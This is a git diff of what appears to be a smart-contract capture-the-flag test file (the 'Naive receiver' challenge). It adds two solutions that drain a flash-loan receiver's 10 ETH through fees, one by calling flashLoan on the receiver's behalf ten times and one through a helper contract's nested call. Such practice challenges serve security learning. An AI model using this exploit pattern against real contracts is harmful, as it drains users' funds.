@@ -11,13 +11,13 @@ describe('[Challenge] Naive receiver', function () {
     // Receiver has 10 ETH in balance
     const ETHER_IN_RECEIVER = 10n * 10n ** 18n;
 
-    before(async function () {
+    beforeEach(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, user, player] = await ethers.getSigners();
 
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
-        
+
         pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: pool.address, value: ETHER_IN_POOL });
         const ETH = await pool.ETH();
@@ -36,8 +36,31 @@ describe('[Challenge] Naive receiver', function () {
         ).to.eq(ETHER_IN_RECEIVER);
     });
 
-    it('Execution', async function () {
+    it('Execution 1', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const ETH = await pool.ETH();
+        console.log("pre:", await ethers.provider.getBalance(receiver.address));
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        await pool.flashLoan(receiver.address, ETH, ETHER_IN_POOL, "0x");
+        console.log("post:", await ethers.provider.getBalance(receiver.address));
+    });
+
+    it('Execution 2', async function () {
+        /** CODE YOUR SOLUTION HERE */
+        const flashLoanCallerFactory = await ethers.getContractFactory('flashLoanCaller', deployer);
+        flashLoanCaller = await flashLoanCallerFactory.deploy(pool.address);
+        const ETH = await pool.ETH();
+        console.log("pre:", await ethers.provider.getBalance(receiver.address));
+        await flashLoanCaller.nestFlashLoan(receiver.address, ETH, ETHER_IN_POOL);
+        console.log("post:", await ethers.provider.getBalance(receiver.address));
     });
 
     after(async function () {
